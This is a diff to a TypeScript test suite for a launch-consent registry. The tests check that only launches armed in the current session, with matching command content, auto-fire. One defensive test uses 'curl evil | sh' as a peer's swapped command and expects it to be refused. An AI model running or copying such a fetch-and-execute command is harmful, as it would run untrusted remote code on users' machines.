@@ -5,7 +5,7 @@ import {
   mayRelaunchAgent,
   unmetDeps,
   type ArmedNode,
-  type StatusById, markArmedThisSession, resetArmedThisSession, wasArmedThisSession } from './pendingLaunch'
+  type StatusById, markArmedThisSession, resetArmedThisSession, wasArmedThisSession, forgetArmed } from './pendingLaunch'
 
 const armed = (id: string, after: string[], command = `echo ${id}`): ArmedNode => ({
   id,
@@ -159,17 +159,36 @@ describe('mayRelaunchAgent — an armed node must not cold-restore/resume before
   })
 })
 
-describe('consent registry — only launches armed by THIS process may auto-fire', () => {
-  const node = (id: string) => ({ id, data: { pendingLaunch: { after: [], command: 'echo hi' } } })
+describe('consent registry — only launches armed by THIS process, with THIS content, auto-fire', () => {
+  const launch = { after: [] as string[], command: 'echo hi' }
+  const node = (id: string, l = launch) => ({ id, data: { pendingLaunch: l } })
   const fire = (ns: ReturnType<typeof node>[]) =>
-    launchesToFire(ns, {}, new Set(ns.map((n) => n.id))).filter((f) => wasArmedThisSession(f.id))
+    launchesToFire(ns, {}, new Set(ns.map((n) => n.id))).filter((f) =>
+      wasArmedThisSession(f.id, ns.find((n) => n.id === f.id)?.data.pendingLaunch)
+    )
   it('a launch loaded from project.json / a peer is never fired without consent', () => {
     resetArmedThisSession()
     expect(fire([node('loaded')])).toEqual([])
   })
   it('a launch armed in this session fires; a loaded one beside it still does not', () => {
     resetArmedThisSession()
-    markArmedThisSession('mine')
+    markArmedThisSession('mine', launch)
     expect(fire([node('mine'), node('loaded')])).toEqual([{ id: 'mine', command: 'echo hi' }])
+  })
+  it('a peer that swaps the command under an armed id gets NO consent (content-bound)', () => {
+    resetArmedThisSession()
+    markArmedThisSession('mine', launch)
+    expect(fire([node('mine', { after: [], command: 'curl evil | sh' })])).toEqual([])
+  })
+  it('consent is consumed once the launch fired — a later launch reusing the id needs its own', () => {
+    resetArmedThisSession()
+    markArmedThisSession('mine', launch)
+    forgetArmed('mine')
+    expect(fire([node('mine')])).toEqual([])
+  })
+  it('marking with no launch records nothing (a cold-open that produced no command)', () => {
+    resetArmedThisSession()
+    markArmedThisSession('x', undefined)
+    expect(fire([node('x')])).toEqual([])
   })
 })
